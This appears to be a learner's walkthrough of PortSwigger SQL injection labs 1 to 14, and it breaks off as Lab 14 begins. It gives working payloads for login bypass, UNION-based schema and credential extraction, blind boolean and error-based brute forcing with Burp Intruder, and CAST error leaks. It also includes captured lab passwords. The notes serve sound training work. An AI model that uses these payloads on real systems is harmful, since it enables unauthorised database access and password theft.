# SQLi

cheatsheet :[SQL injection cheat sheet | Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)

# lab 1 : **SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

##**The Core Concept**
This is the most fundamental SQL injection attack. The application is trying to run a query that says: "Show me products where the category is 'Gifts' AND the product is released."

We want to change the query to say: "Show me products where the category is 'Gifts' OR 1 equals 1 (which is always true)."

By adding OR 1=1, we force the database to return every single row in the table, regardless of whether it is "released" or not. We also use a comment character (--) to ignore the rest of the original query (the part that checks if released = 1).

Step-by-Step Walkthrough
You can use Burp Suite for this, or simply edit the URL in your browser.

Step 1: Analyze the URL
Open the lab.

Click on a category filter, for example, "Gifts".
![image.png](image.png)

Look at the URL in your browser address bar. It should look like: .../filter?category=Gifts

Step 2: Construct the Payload
We need to inject code that closes the category string and adds our "True" condition.

Payload: ' OR 1=1--

Breakdown:

' : Closes the data field ('Gifts').

OR 1=1 : The logic hack. Since 1 always equals 1, the database includes everything.

-- : The comment symbol. It tells the database to ignore everything that comes after it (specifically, the AND released = 1 check).

Step 3: Inject the Attack
Go to the URL bar in your browser.

Delete Gifts and replace it with your payload.

Note: Browsers don't like spaces in URLs, so we often use + instead of space.

Full URL ending: .../filter?category='+OR+1=1--

Press Enter.

Step 4: Verify Success
The page should reload and show all products, including ones you didn't see before (the unreleased/hidden products). Then lab will be marked as Solved.




# **LAB 2  : SQL injection vulnerability allowing login bypass**

The Core Concept
This lab uses the exact same logic as the previous "Hidden Data" lab, but applies it to the Login Page.

The database query for logging in usually looks like this: SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT'

We want to trick the database into stopping immediately after it checks the username, completely ignoring the password check.

We do this by inserting a Comment Character (--).

Our Goal: SELECT * FROM users WHERE username = 'administrator'--' AND password = '...'

Result: The database reads "Find the user named administrator." It sees the -- and thinks "Everything after this is just a comment/note," so it ignores the password check entirely.

Step-by-Step Walkthrough
You can use Burp Suite or just the browser login form.

Step 1: Identify the Target
Open the lab and go to the "My account" login page.

We know the username is administrator (as stated in the lab description).

Step 2: Construct the Payload
We need to close the username string and comment out the rest.

Payload: administrator'--

Breakdown:

administrator: The user we want to become.

': Closes the username data field.

--: The comment symbol (in PostgreSQL and many other SQL languages).

Step 3: Inject the Attack
In the Username box, type: administrator'--

In the Password box, type anything (e.g., abc). It doesn't matter because the database will ignore it.

Click Login.

Step 4: Verify Success
You should be logged in immediately as the administrator. The lab is marked as Solved.


# LAB 3 :  **SQL injection attack, querying the database type and version on Oracle**

### **The Core Concept :**

To solve this, you need to understand two things:

1. **UNION Attack:** This allows you to combine the results of the original website query with the results of *your* injected query.
2. **The Oracle Rule:** In most databases, you can just say `SELECT 'abc'`. But in Oracle, **every SELECT statement must have a FROM clause**. If you don't have a real table to select from, Oracle provides a built-in dummy table called **`dual`**.

So, instead of `SELECT 'abc'`, you **must** write `SELECT 'abc' FROM dual`.

---

### **Step-by-Step Walkthrough**

You can solve this using **Burp Suite** (recommended) or simply by editing the **URL bar** in your browser. I will explain the logic so you can do either.

### **Step 1: Find the Injection Point**

1. Open the lab.
2. Click on any category filter (e.g., "Gifts", "Pets").
3. Look at the URL or the request in Burp Suite. You will see something like:
`.../filter?category=Gifts`
4. The injection point is right after the category name (`Gifts`).

### **Step 2: Determine the Number of Columns**

We need to know how many columns the website's original query is asking for. We do this by trial and error using `UNION SELECT NULL`.

- **Attempt 1 (Guessing 1 column):**
Add this to the end of the category parameter:
`' UNION SELECT NULL FROM dual--`
    - *Result:* **Internal Server Error** (This means the column count is wrong).
- **Attempt 2 (Guessing 2 columns):**
Add this:
`' UNION SELECT NULL, NULL FROM dual--`
    - *Result:* **The page loads normally!**
    - *Conclusion:* The query has **2 columns**.

> Note on Syntax:
> 
> - `'` : Closes the original text string.
> - `UNION SELECT` : Joins your query.
> - `NULL, NULL` : Placeholders for the 2 columns we discovered.
> - `FROM dual` : Required by Oracle.
> - `-` : Comments out the rest of the original code so it doesn't cause errors.

### **Step 3: Check Which Column Holds Text**

Before we can extract the version info, we need to ensure the columns allow text data (strings).

1. Try replacing the first `NULL` with a string:
`' UNION SELECT 'abc', NULL FROM dual--`
    - *If page loads:* Column 1 accepts text.
2. Try replacing the second `NULL`:
`' UNION SELECT NULL, 'abc' FROM dual--`
    - *If page loads:* Column 2 accepts text.

*In this specific lab, both usually accept text.*

### **Step 4: Extract the Database Version**

Now that we know there are **2 columns** and we can put text in them, we can ask the database for its version.

Oracle stores its version information in a special table called **`v$version`**, and the column usually containing the readable text is called **`banner`**.

1. Construct your final payload. We will put `banner` in the first column slot:SQL
    
    `' UNION SELECT banner, NULL FROM v$version--`
    
2. **Inject it.** If you are using the browser URL bar, it should look like this (handling spaces):Plaintext
    
    `filter?category=Gifts'+UNION+SELECT+banner,+NULL+FROM+v$version--`
    
3. **Result:** Look at the page content. Where the product titles usually are, you should now see a database version string (e.g., `Core 11.2.0.2.0 Production`).

### **Step 5: Completion**

Once the version string is displayed on the screen, the lab will automatically mark itself as **Solved**.

![image.png](image%201.png)

# LAB 4 : **SQL injection attack, querying the database type and version on MySQL and Microsoft**

### **The Core Concept**

This lab is actually slightly easier than the Oracle one you just saw.

1. **No "FROM" Clause Needed:** Unlike Oracle, both MySQL and Microsoft SQL Server allow you to run `SELECT` without specifying a table. You don't need the dummy `dual` table.
2. **The Version Variable:** Instead of querying a table like `v$version`, these databases use a global variable called **`@@version`** to hold the version string.
3. **The Comment Character:** In URLs for these databases, we often use the hash symbol **`#`** to comment out the rest of the query (instead of `-`).

---

### **Step-by-Step Walkthrough**

You can use **Burp Suite** or the **URL bar**.

> Important URL Tip: If you are typing this directly into your browser's address bar, the # character is special. You must type it as %23. If you type #, the browser won't send it to the server.
> 

### **Step 1: Find the Injection Point**

1. Open the lab.
2. Click on a category filter (e.g., "Gifts").
3. Locate the parameter in the URL: `.../filter?category=Gifts`

### **Step 2: Determine the Number of Columns**

Just like before, we need to match the number of columns in the original query using `UNION SELECT NULL`.

- **Attempt 1 (Guessing 1 column):**`' UNION SELECT NULL#`
    - *Result:* Error (Column count is wrong).
- **Attempt 2 (Guessing 2 columns):**`' UNION SELECT NULL, NULL#`
    - *Result:* **The page loads normally.**
    - *Conclusion:* The query has **2 columns**.

> Note on Syntax:
> 
> - `'` : Closes the category string.
> - `UNION SELECT` : Joins your query.
> - `NULL, NULL` : Placeholders for the 2 columns.
> - `#` : Comments out the rest. (Remember: use `%23` in the browser bar).

### **Step 3: Check Which Column Holds Text**

We need to confirm the columns allow text data.

1. Try replacing the first `NULL` with a string:
`' UNION SELECT 'abc', NULL#`
    - *If page loads:* Column 1 accepts text.
2. Try replacing the second `NULL`:
`' UNION SELECT NULL, 'abc'#`
    - *If page loads:* Column 2 accepts text.

*In this lab, both COLUMNS accept text.*

### **Step 4: Extract the Database Version**

Now we ask the database for the version using the `@@version` variable. We will display it in the first column.

1. Construct your payload:SQL
    
    `' UNION SELECT @@version, NULL#`
    
2. **Inject it.** If doing this in the browser URL bar (remembering to encode the `#`), it looks like this:Plaintext
    
    `filter?category=Gifts'+UNION+SELECT+@@version,+NULL%23`
    
3. **Result:** Look at the page content where the product list usually is. You should see a long string describing the database.

![image.png](image%202.png)

### **Step 5: Completion**

Once that version string renders on the page, the lab is marked as **Solved**.

# LAB 5 : **SQL injection attack, listing the database contents on non-Oracle databases**

### **The Core Concept**

This lab is more advanced than the previous ones. You aren't just asking for a version number; you are acting like a spy trying to steal a map of the building (the database structure) to find the safe (the passwords).

Since this is a **non-Oracle** database (likely PostgreSQL or MySQL), it uses a standard internal book called **`information_schema`**.

- **`information_schema.tables`**: A list of all tables in the database.
- **`information_schema.columns`**: A list of all columns inside those tables.

---

### **Step-by-Step Walkthrough**

You can use **Burp Suite** or your **browser URL bar**.

### **Step 1: Determine the Number of Columns**

We need to make sure our injected query matches the website's query structure.

1. Try: `' UNION SELECT NULL, NULL--`
2. the page loads without error, and we got to know that there are **2 columns**. 
3. Check if they accept text: `' UNION SELECT 'abc', 'def'--`
    - *Result:* Page loads with "abc" and "def" visible. We are good to go.
    
    ![image.png](image%203.png)
    

### **Step 2: Find the Table Name**

we know that the database we are going to check is non oracle means it could be microsoft  , mysql postgresql so we have to find this using the the version payloads we have used in the last labs :

`' UNION SELECT @@version, NULL--`

`' UNION SELECT version(), NULL--` —> 200K ( THAT MEANS THIS IS PostgreSQL database ) 

We need to find a table that looks like it holds user credentials (e.g., something named `users`). We ask `information_schema.tables` for a list of table names.

1. **Payload:**
    
    `' UNION SELECT table_name, NULL FROM information_schema.tables--`
    
2. **Inject it.** Look through the results on the page.

![image.png](image%204.png)

1. **Search:** You will see many system tables. Scroll down until you see a generic-looking table name that stands out, usually something like **`users_lixbvf`** (the random letters will be different for you).

### **Step 3: Find the Column Names**

Now that we have the table name , we need to know what the columns inside it are called (e.g., is it `user`? `username`? `usr_name`?). We ask `information_schema.columns`.

1. **Payload:**
    - Replace `YOUR_TABLE_NAME` with the name you found in Step 2.
    
    `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_lixbvf'--`
    
2. **Inject it.**
3. **Search:** Look at the results again. You are looking for two column names that sound like username and password. They will likely have random suffixes,and we got :

![image.png](image%205.png)

![image.png](image%206.png)

- *Write these down.*

### **Step 4: Extract the Usernames and Passwords**

Now we have the map:

- **Table:** `users_lixbvf`
- **Columns:** `username_fcqimg`, `password_bkeimn`

We can simply select this data directly.

1. **Payload:**SQL
    
    `' UNION SELECT username_fcqimg, password_bkeimn FROM users_lixbvf--`
    
2. **Inject it.**
3. **Result:** The page will now list the actual usernames and passwords from the database.

![image.png](image%207.png)

1. Find the user named **`administrator`** and copy their password.

### **Step 5: Login and Solve**

1. Click the **"My account"** or **"Login"** button on the top right.
2. Enter the username `administrator`.
3. Paste the password you just stole.
4. Click Login.

The lab is now **Solved**.

# **Lab6 : SQL injection attack, listing the database contents on Oracle**

### **The Core Concept**

This lab combines what you learned in the previous two labs.

1. **The Oracle Rule:** You must always specify a table. If you are just checking columns, use `FROM dual`.
2. **Different Dictionary:** Oracle doesn't use `information_schema`. Instead, it uses:
    - **`all_tables`**: To list table names.
    - **`all_tab_columns`**: To list column names.
3. **The Uppercase Trap:** In Oracle, table names are stored internally as **UPPERCASE**. When you search for a table name (e.g., in a `WHERE` clause), you usually must write it in all caps, or the database won't find it.

---

### **Step-by-Step Walkthrough**

You can use **Burp Suite** or your **browser URL bar**.

### **Step 1: Determine the Number of Columns**

First, we verify the number of columns and the ability to inject text. Remember the `dual` table.

1. **Payload:**SQL
    
    `' UNION SELECT 'abc', 'def' FROM dual--`
    
2. **Inject it.**
    - *Result:* If the page loads with "abc" and "def" visible, we have confirmed **2 text columns**.

### **Step 2: Find the Table Name**

We need to find the table holding the passwords. We query `all_tables`.

1. **Payload:**SQL
    
    `' UNION SELECT table_name, NULL FROM all_tables--`
    
2. **Inject it.**
3. **Search:** Scroll through the results. You will see many system tables (like `DUAL`, `SYSTEM_PRIVILEGE_MAP`, etc.). Look for something distinct that looks like a user table, usually **`USERS_ABCDEF`** (the random letters will vary).
    - *Write down this table name.*

![image.png](image%208.png)

### **Step 3: Find the Column Names**

Now we ask `all_tab_columns` for the columns inside that table.
**Crucial:** When you put the table name in the `WHERE` clause, it must be exactly as it appeared in Step 2 (usually **UPPERCASE**).

1. **Payload:**SQL
    - Replace `USERS_XVNORY` with the name you found.
    
    `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_XVNORY'--`
    
2. **Inject it.**
3. **Search:** Look for columns that sound like credentials. They will likely be:
4. 
    - *Write these down.*

![image.png](image%209.png)

### **Step 4: Extract the Usernames and Passwords**

Now that we have the specific table and column names, we can pull the data.

1. **Payload:**SQL
    - Replace the table and columns with the ones you found.
    
    `' UNION SELECT USERNAME_RUEORQ, PASSWORD_FWITSH FROM USERS_XVNORY--`
    
2. **Inject it.**
3. **Result:** The page will display the list of users and passwords.
4. Copy the password for the **`administrator`**.
5. 

![image.png](image%2010.png)

### **Step 5: Login and Solve**

1. Click **"My account"**.
2. Log in as `administrator` with the stolen password.
3. The lab is marked **Solved**.

# LAB 7 : **SQL injection UNION attack, determining the number of columns returned by the query**

### **The Core Concept**

Before you can steal data using a `UNION` attack (like you did in previous labs), you must pass a strict database rule:
**The number of columns in your injected query must match the number of columns in the original query.**

If the website asks for 2 columns and you provide 1 (or 3), the database will crash (Internal Server Error). This lab is simply about counting 1, 2, 3... until the database stops crashing.

---

### **Step-by-Step Walkthrough**

You can use **Burp Suite** or your **browser URL bar**.

### **Step 1: Find the Injection Point**

1. Open the lab.
2. Click on a category filter (e.g., "Gifts").
3. Look at the URL: `.../filter?category=Gifts`

### **Step 2: Start Counting (Trial and Error)**

We will inject `UNION SELECT NULL` and keep adding more `NULL`s until the error goes away.

- **Attempt 1 (1 Column):**
Add this to the end of the URL:
`' UNION SELECT NULL--`
    - *Result:* **Internal Server Error** .
    - *Meaning:* The query does **not** have 1 column.
- **Attempt 2 (2 Columns):**
Add another NULL:
`' UNION SELECT NULL, NULL--`
    - *Result:* **Internal Server Error**.
    - *Meaning:* The query does **not** have 2 columns.
- **Attempt 3 (3 Columns):**
Add a third NULL:
`' UNION SELECT NULL, NULL, NULL--`
    - *Result:* **The page loads normally!**
    - *Meaning:* The query has **3 columns**.

> Why NULL?
We use NULL because it is valid in almost any column type (numbers, text, dates). If we tried 'abc' in a number column, it would crash even if we had the count right. NULL is the safest way to count.
> 

### **Step 3: Completion**

Once you send the request with the correct number of NULLs (3 in this specific lab) and the page loads without error, the lab will automatically mark itself as **Solved**.

# LAB 8 :

### **The Core Concept**

In the previous lab, you learned how to count columns using `NULL` (e.g., `SELECT NULL, NULL, NULL`).
However, databases are strict about data types. You cannot put text (like a password) into a column designed for numbers (like a price).

This lab requires you to "probe" each of the empty columns to find out which one accepts text (Strings). The lab gives you a specific unique ID (’ZEmAuP’) that you must successfully display on the screen to win.

![image.png](image%2011.png)

---

### **Step-by-Step Walkthrough**

### **Step 1: Find the Target String**

1. Open the lab.
2. Look at the top of the page description. It will say something like:
*"Make the database retrieve the string: 'ZEmAuP’*(The exact string will be different for you).
3. **Copy this string.** You will need it.

### **Step 2: Confirm the Column Count**

Just like the last lab, we need to verify how many columns exist.

1. Click a category.
2. Inject the 3-column check:
`' UNION SELECT NULL, NULL, NULL--`
3. *Result:* The page should load normally. This confirms there are **3 columns**.

### **Step 3: Probe the Columns (Trial and Error)**

Now we act like a detective checking 3 different doors to see which one opens. We will replace one `NULL` at a time with your target string.

**Attempt 1: Try the First Column**

- **Payload:**`' UNION SELECT 'YOUR_STRING', NULL, NULL--`
- **Action:** Replace `YOUR_STRING` with the code you copied in Step 1.
- **Result:** You will likely get an **Internal Server Error**.
- **Meaning:** The first column is probably a number (like an ID), so it rejected your text.

**Attempt 2: Try the Second Column**

- **Payload:**`' UNION SELECT NULL, 'YOUR_STRING', NULL--`
- **Result:** **Internal Server Error** (usually).
- **Meaning:** The second column also rejects text.

**Attempt 3: Try the Third Column**

- **Payload:**`' UNION SELECT NULL, NULL, 'YOUR_STRING'--`
- **Result:** **The page loads!**
- **Meaning:** The third column accepts text.

### **Step 4: Verify the Win**

1. Once the page loads with Attempt 3 (or whichever column worked for you), look at the page content.
2. You should see your random string , displayed somewhere on the screen, perhaps at the bottom of the product list.
3. The lab will automatically mark itself as **Solved**.

![image.png](image%2012.png)

![image.png](image%2013.png)

# LAB 9 :**SQL injection UNION attack, retrieving data from other tables**

### **The Core Concept**

This is the "Boss Level" of the basic UNION attack section. You are combining everything you've learned so far:

1. **Count** the columns.
2. **Check** which ones accept text.
3. **Steal** the data by selecting from the `users` table instead of using dummy data.

The lab explicitly tells you the table name is **`users`** and the columns are **`username`** and **`password`**, so you don't need to guess them.

---

### **Step-by-Step Walkthrough**

### **Step 1: Determine the Number of Columns**

1. Open the lab and click on a category (e.g., "Gifts").
2. Test for 2 columns using `NULL`:
`' UNION SELECT NULL, NULL--`
3. *Result:* The page loads normally. This confirms there are **2 columns**.

### **Step 2: Check for Text Compatibility( before this step you must try yourself o check the version of the database to understand about the database and them you can use the correct query to retireve data according to the database ):**

![image.png](image%2014.png)

We need to make sure *both* columns can hold text because we want to extract both a username (text) and a password (text).

1. **Payload:**`' UNION SELECT 'abc', 'def'--`
2. **Result:** The page loads, and you can likely see "abc" and "def" somewhere in the list.
    - *Conclusion:* Both columns are safe for text.

### **Step 3: Retrieve the Data**

Now, instead of selecting 'abc' and 'def', we select the actual column names (`username`, `password`) from the actual table (`users`).

1. **Construct the Payload:**SQL
    
    `' UNION SELECT username, password FROM users--`
    
2. **Inject it.** If using the browser URL bar:Plaintext
    
    `filter?category=Gifts'+UNION+SELECT+username,+password+FROM+users--`
    
3. **Result:** Look at the page content.
    - The website usually displays products (Title and Description).
    - Now, inside that list, you will see user data mixed in.
    - **Column 1 (Title)** will show the `username`.
    - **Column 2 (Description)** will show the `password`.

### **Step 4: Find the Administrator**

1. Scroll through the results until you find the user **`administrator`**.
2. Copy the password listed next to it.

![image.png](image%2015.png)

### **Step 5: Log In**

1. Click **"My account"**.
2. Enter:
    - **Username:** `administrator`
    - **Password:** (The string you just copied)
3. Click Login.

The lab is now **Solved**.

# LAB 10 : **SQL injection UNION attack, retrieving multiple values in a single column**

### **The Core Concept**

In previous labs, you had two text columns available, so you could put the `username` in one and the `password` in the other. Easy.

But what if the website's query returns two columns, but **only one of them allows text**? (For example, one column is for the product price—numbers only—and the other is for the description).

You still need to steal two things (username + password), but you only have one column that fits them.
**The Solution:** You must "tape" the username and password together into a single string using **concatenation**.

- Instead of: `Select username, password` (Needs 2 text columns)
- We use: `Select username || '~' || password` (Fits in 1 text column)

---

### **Step-by-Step Walkthrough**

### **Step 1: Determine the Number of Columns**

1. Open the lab.
2. Check for 2 columns using `NULL`:
`' UNION SELECT NULL, NULL--`
3. *Result:* The page loads normally. We have **2 columns**.

### **Step 2: Find the Single Text Column**

We need to find out which of the two columns allows text.

- **Attempt 1 (Try Column 1):**`' UNION SELECT 'abc', NULL--`
    - *Result:* **Internal Server Error**.
    - *Meaning:* Column 1 is likely a number (ID or Price) and rejects text.
- **Attempt 2 (Try Column 2):**`' UNION SELECT NULL, 'abc'--`
    - *Result:* **Success!** The page loads.
    - *Meaning:* **Column 2 is our target.** We must put all our stolen data here.

### **Step 3: Construct the "Merged" Payload**

We need to combine the `username` and `password` from the `users` table.

Most databases use the double pipe symbol `||` to merge text. We will also add a separator character (like `~` or `:`) so we can tell where the username ends and the password begins.

**The Logic:**`username || '~' || password`

**The Full Payload:**
We place this logic into the **second** column slot (because that's the one that accepts text).

SQL

`' UNION SELECT NULL, username || '~' || password FROM users--`

### **Step 4: Inject and Extract**

1. **Inject the payload.** If using the browser URL bar:Plaintext
    
    `filter?category=Gifts'+UNION+SELECT+NULL,+username||'~'||password+FROM+users--`
    
    *(Note: In some browsers/databases, you might need to URL encode the `~` or `||`, but usually, this works directly in this lab).*
    
2. **Result:** Look at the product list on the page.
    - Where the product descriptions usually are, you will see strings like:
    `administrator~s0m3r4nd0mp4ssw0rdwiener~petercarlos~montoya`

### **Step 5: Login and Solve**

1. Find the line starting with **`administrator~`**.\

![image.png](image%2016.png)

![image.png](image%2017.png)

2.The text *after* the `~` is the password. Copy it.

3.Click **"My account"**.

4.Log in as `administrator` with the copied password.

The lab is now **Solved**.

![image.png](image%2018.png)

# LAB 11 : **Blind SQL injection with conditional responses**

### **The Core Concept**

This is a major shift from the previous labs.

- **Previously (UNION):** You asked the database for data, and it printed the results on the screen.
- **Now (Blind):** The database **will not** show you the data. It will not even show you an error message.

**So, how do we steal the password?**
 We can ask the database a **True or False** question.

- **If the answer is TRUE:** The website loads normally (and shows a "Welcome back" message LIKE THAT).
- **If the answer is FALSE:** The "Welcome back" message disappears.

We will write a script (using Burp Intruder) to ask: *"Is the first letter of the password 'a'?"* If the "Welcome back" message appears, we know it's 'a'. If not, we ask about 'b', and so on.

---

### **Step-by-Step Walkthrough**

You **must** use **Burp Suite** for this lab. It is too tedious to do manually in the browser.

### **Step 1: Confirm the Vulnerability**

1. Open Burp Suite and ensure "Interceptor" is **On**.
2. Refresh the lab page.
3. Find the request in Burp. Look for the `Cookie` header. It will look like:
`Cookie: TrackingId=xyz123...; session=...`
4. Send this request to **Repeater** (Right-click -> Send to Repeater).

Now we test if we can control the True/False logic.

- **Test 1 (True):**
Append `' AND '1'='1` to the TrackingId.
`TrackingId=xyz; ' AND '1'='1`
    - **Send.** Look at the response. Search for the string "Welcome back". It should be there.
    - 
    
    ![image.png](image%2019.png)
    
- **Test 2 (False):**
Change it to  : TrackingId=lGD36UJFJ3NDKvP6' AND '1'='2
    - **Send.** Search for "Welcome back". It should **NOT** be there.

*Conclusion:* We can now toggle the website's response. The database is listening to us.

### **Step 2: Determine the Password Length**

Before guessing letters, we need to know how many letters to guess. We ask: *"Is the password length greater than X?"*

1. In **Repeater**, use this payload:SQL
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a`
    
2. **Send.**
    - If you see "Welcome back", the length is **greater than 19**. (It is).
3. Try changing `>19` to `>20`.
    - The "Welcome back" message disappears.
    - *Conclusion:* The password is exactly **20 characters long**.

### **Step 3: Brute Force the Password (The Attack)**

Now we need to guess each of the 20 characters. We will use **Burp Intruder** to automate this.

1. **Prepare the Payload:**
In Repeater, replace your cookie with this query. This asks: *"Is the **1st** letter of the password equal to 'a'?"*SQL
    
    `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
    
2. **Send to Intruder:** Right-click the request -> **Send to Intruder**.
3. **Configure Positions:**
    - Go to the **Intruder > Positions** tab.
    - Burp usually highlights everything. Click **"Clear §"**.
    - Highlight *only* the letter `'a'` at the very end of your payload.
    - Click **"Add §"**. It should look like this: `...='§a§`
    - 
    
    ![image.png](image%2020.png)
    
4. **Configure Payloads:**
    - Go to the **Payloads** tab.
    - **Payload type:** Simple list.
    - **Payload Options:** Add the letters `a` through `z` and numbers `0` through `9`. (You can use the "Add from list" dropdown -> "a-z" and then "0-9").
5. **Configure "Grep - Match" (Crucial Step):**
    - Go to the **Settings** tab (or "Options" in older versions).
    - Find the **"Grep - Match"** section.
    - Click **Clear** to remove defaults.
    - Type `Welcome back` and click **Add**.
    - 
    
    ![image.png](image%2021.png)
    
    - *Why?* This tells Burp to put a checkbox in the results if the login was successful (meaning we guessed the right letter).
6. **Start Attack:**
    - Click **Start Attack**.
    - Watch the results window. Look at the column named **"Welcome back"**.
    - One row will have a checkbox (or a different length/status code). That is your first letter.
    - 
    
    ![image.png](image%2022.png)
    

### **Step 4: Repeat for All Characters**

- **Current state:** You found the 1st LETTER ( THAT IS A NUMBER = 4 ).
- **Next:** Go back to the **Positions** tab. Change the `SUBSTRING` offset from `1` to `2`.
`...SUBSTRING(password,2,1)...`
- **Run attack again.** Find the 2nd letter.
- **Repeat:** Do this until you have all 20 characters.

*(Note: In the Pro version of Burp, or using "Cluster Bomb" mode, you can do all 20 at once, but doing it one by one is the safest way to learn exactly how it works).*

### **Step 5: Login**

1. Combine all the letters you found to form the password.
2. Go to the browser, click **"My account"**.
3. Login as `administrator`.

you can check your password : 493elcdisz6u8ztn93iz

# LAB 12 : **Blind SQL injection with conditional errors**

### **The Core Concept**

This lab is tricky because the application is very stubborn.

- **No Data:** It won't show you the results (like UNION attacks).
- **No Boolean Logic:** The page looks exactly the same whether your query is true or false (unlike the previous lab).

**So, how do we communicate?**
We force the database to **crash** (generate an error) only when we are right.

- **If our guess is WRONG:** The database does nothing. The page loads normally (HTTP 200).
- **If our guess is RIGHT:** We force a "Divide by Zero" error. The page crashes (HTTP 500).

---

### **Step-by-Step Walkthrough**

You **must** use **Burp Suite** for this.

### **Step 1: Confirm it is Oracle**

First, we need to prove we can inject SQL and that this is an Oracle database (which requires strict syntax).

1. Send the request to **Repeater**.
2. Try to append a subquery. In Oracle, we use `||` to join strings and `FROM dual` for dummy queries.
    - **Payload:** `TrackingId=xyz'||(SELECT '' FROM dual)||'`
    
    ![image.png](image%2023.png)
    
    - **Result:** The page loads normally (HTTP 200).
    - *Meaning:* The syntax is valid. It is likely Oracle.
3. Try to query a fake table to prove we are actually running SQL.
    - **Payload:** `TrackingId=xyz'||(SELECT '' FROM not_real_table)||'`
    - **Result:** **Internal Server Error (HTTP 500)**.
    - *Meaning:* The database tried to find that table, failed, and crashed. We have control.

### **Step 2: Create the "Crash Switch"**

We need a logic bomb. We use a `CASE` statement to verify a condition.

- *Logic:* `CASE WHEN (1=1) THEN (CRASH) ELSE (SAFE) END`
- *The Crash:* In Oracle, `TO_CHAR(1/0)` causes a divide-by-zero error.

**Verify the Switch:**

1. **Test True (Should Crash):**SQL
    
    `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    
    - *Result:* **HTTP 500 Error**. (This confirms "True" = Error).
2. **Test False (Should NOT Crash):**SQL
    
    `'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    
    - *Result:* **HTTP 200 OK**.

### **Step 3: Check Password Length**

Now we replace `1=1` with a question about the password length.

1. **Payload:**SQL
    
    `'||(SELECT CASE WHEN LENGTH(password)>19 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
2. **Send.**
    - *Result:* **HTTP 500 Error**.
    - *Meaning:* "Yes, the length is greater than 19."
3. Change `>19` to `>20`.
    - *Result:* **HTTP 200 OK**.
    - *Meaning:* "No, it is not greater than 20."
    - *Conclusion:* The password is exactly **20 characters**.

### **Step 4: Brute Force the Password**

We will guess each letter. Remember: **Error (500) means we found the letter.**

1. **Prepare Payload:**
In Repeater, set up the query to check the **1st** character against 'a'.SQL
    
    `'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
2. **Send to Intruder:** Right-click -> Send to Intruder.
3. **Configure Positions:**
    - Clear all markers (`§`).
    - Highlight only the letter `'a'` in the query.
    - Add marker: `...='§a§'...`
4. **Configure Payloads:**
    - **Type:** Simple List.
    - **Options:** Add `a-z` and `0-9`.
5. **Start Attack & Analyze:**
    - Click **Start Attack**.
    - **Crucial:** Look at the **Status** column.
    - Most rows will be **200** (Wrong guess).
    - **One row will be 500** (Correct guess). That is your letter.

### **Step 5: Repeat and Solve**

1. Change the offset in `SUBSTR(password, 2, 1)` to find the 2nd letter.
2. Repeat until you have all 20 characters.
3. Log in as `administrator`.

check your password : ys3xaxlseofzoiizsqwy

# LAB 13 : **Visible error-based SQL injection**

### **The Core Concept**

This technique is often faster than the "Blind" methods you just used.
Instead of playing "20 Questions" (Yes/No), we trick the database into **crashing** in a very specific way.

We ask the database to take a piece of text (like a password) and convert it into a number (Integer).

- **Our Command:** "Please convert the password 'Secret123' into a number."
- **Database Response:** "Error! I cannot convert **'Secret123'** into a number."

See what happened? The database printed the secret password inside the error message itself! This is called **Error-Based SQL Injection**.

---

### **Step-by-Step Walkthrough**

You **must** use **Burp Suite** for this lab to see the error messages clearly.

### **Step 1: Confirm the Vulnerability**

1. Open Burp Suite and capture a request to the home page.
2. Send the request to **Repeater**.
3. Find the `TrackingId` cookie. Add a single quote `'` to the end.
    - `TrackingId=xyz'`
4. **Send.**
5. **Result:** You will see a detailed error message in the response (e.g., `Unterminated string literal...`). This confirms the server is printing database errors back to you.
6. 

![image.png](image%2024.png)

### **Step 2: Construct the "Casting" Payload**

We need to create a valid SQL query that forces a data type conversion error. We use `CAST(... AS int)`.

1. First, let's try a test query. We want to verify we can inject logical commands.
    - **Payload:**SQL
        
        `' AND 1=CAST((SELECT 1) AS int)--`
        
    - **Explanation:** We are checking if 1 equals 1 (converted to an int). This is valid, so it should **not** throw any error.
2. **Inject it.**
    - *Result:* The page loads normally. This proves our syntax is correct.

### **Step 3: The "Truncation" Trap**

Now we try to steal the username.

- **Payload:**SQL
    
    `' AND 1=CAST((SELECT username FROM users) AS int)--`
    
- **Result:** You likely get a **Syntax Error** (unclosed string) instead of the conversion error we want.
- **Why?** The server has a **character limit** on the cookie. Your payload is too long, so the important part (the `-` comment) gets cut off.
- **The Fix:** Delete the original random characters in the `TrackingId` (the `xyz...`) to make room for your payload.

### **Step 4: Leak the Username**

Now, with the empty cookie space, we launch the attack.

1. **Clear the cookie value** and insert the payload.
    - **Payload:**SQL
        
        `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
        
    - *Note:* We use `LIMIT 1` because the query can only handle one row at a time.
    
    ![image.png](image%2025.png)
    
2. **Send.**
3. **Result:** Look at the error message in the response.
    - *Message:* `ERROR: invalid input syntax for type integer: "administrator"`
    - **Success!** The database tried to convert "administrator" to a number, failed, and printed the name in the error.
    
    ![image.png](image%2026.png)
    

### **Step 5: Leak the Password**

Now we just change the target column from `username` to `password`.

1. **Payload:**SQL
    
    `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
    
2. **Send.**
3. **Result:** Look at the error message.
    - *Message:* `ERROR: invalid input syntax for type integer: "s3cr3tp4ssw0rd"` (Your password will be different).
    - **Action:** Copy this password.
    - 
    
    ![image.png](image%2027.png)
    

### **Step 6: Login and Solve**

1. Go to the browser.
2. Click **"My account"**.
3. Log in with:
    - **Username:** `administrator`
    - **Password:** (The string you found in the error message).

The lab is now **Solved**.

# LAB 14 : **Blind SQL injection with time delays**

### **The Core Concept**

This is the "Last Resort" technique.

- **Visible SQLi:** The database shows you the data.
- **Blind (Boolean):** The database changes the page (Yes/No).
- **Blind (Error):** The database crashes the page (Error/No Error).
